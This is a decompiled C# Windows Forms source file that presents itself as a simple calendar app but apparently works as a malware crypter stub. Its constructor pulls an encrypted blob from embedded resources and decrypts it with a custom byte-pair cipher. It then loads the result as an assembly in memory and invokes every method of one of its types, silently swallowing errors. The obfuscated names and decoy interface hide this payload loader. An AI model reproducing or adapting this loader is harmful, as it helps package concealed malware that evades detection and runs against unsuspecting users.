using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using noishjazjsi.My.Resources;

namespace noishjazjsi;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("MonthCalendar1")]
	private MonthCalendar _MonthCalendar1;

	[AccessedThroughProperty("DateTimePicker1")]
	private DateTimePicker _DateTimePicker1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	private object horse;

	private MethodInfo ton;

	private Type t;

	private byte[] o;

	private object g;

	private string y;

	internal virtual _003F MonthCalendar1
	{
		get
		{
			return _MonthCalendar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MonthCalendar1 = value;
		}
	}

	internal virtual _003F DateTimePicker1
	{
		get
		{
			return _DateTimePicker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DateTimePicker1 = value;
		}
	}

	internal virtual _003F Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		MonthCalendar1 = new MonthCalendar();
		DateTimePicker1 = new DateTimePicker();
		Button1 = new Button();
		((Control)this).SuspendLayout();
		object monthCalendar = (object)MonthCalendar1;
		Point location = new Point(112, 156);
		((Control)monthCalendar).set_Location(location);
		((Control)MonthCalendar1).set_Name("MonthCalendar1");
		((Control)MonthCalendar1).set_TabIndex(0);
		object dateTimePicker = (object)DateTimePicker1;
		location = new Point(128, 87);
		((Control)dateTimePicker).set_Location(location);
		((Control)DateTimePicker1).set_Name("DateTimePicker1");
		object dateTimePicker2 = (object)DateTimePicker1;
		Size size = new Size(200, 20);
		((Control)dateTimePicker2).set_Size(size);
		((Control)DateTimePicker1).set_TabIndex(1);
		object button = (object)Button1;
		location = new Point(396, 110);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		object button2 = (object)Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(506, 320);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)Button1);
		((Control)this).get_Controls().Add((Control)DateTimePicker1);
		((Control)this).get_Controls().Add((Control)MonthCalendar1);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_Text("noishjazjsi");
		((Control)this).ResumeLayout(false);
	}

	public static int momo(int nb)
	{
		return nb % 256;
	}

	public static byte[] Decrypt(byte[] input, int key)
	{
		checked
		{
			int num = input.Length - 2;
			for (int i = 0; i <= num; i += 2)
			{
				int num2 = input[i];
				int num3 = input[i + 1];
				int j = 2 * num3 - key - num2;
				int k;
				for (k = key - num2 + num3; k < 0; k += 256)
				{
				}
				for (; j < 0; j += 256)
				{
				}
				input[i] = (byte)momo(k);
				input[i + 1] = (byte)momo(j);
			}
			return input;
		}
	}

	public Type quack(Assembly a)
	{
		return a.GetTypes()[5];
	}

	public Assembly aslo(byte[] a)
	{
		return AppDomain.CurrentDomain.Load(a);
	}

	public Form1()
	{
		horse = new object[0];
		g = RuntimeHelpers.GetObjectValue(((ResourceManager)Resources.unknown_0).GetObject((string)Resources.unknown_3));
		y = (string)Resources.unknown_2;
		InitializeComponent();
		o = Decrypt((byte[])g, Conversions.ToInteger(y));
		object obj = aslo(o);
		t = quack((Assembly)obj);
		MethodInfo[] methods = t.GetMethods();
		foreach (MethodInfo methodInfo in methods)
		{
			try
			{
				methodInfo.Invoke(null, (object[])horse);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	static void x16()
	{
		/*Error: Unexpected end of block*/;
	}
}
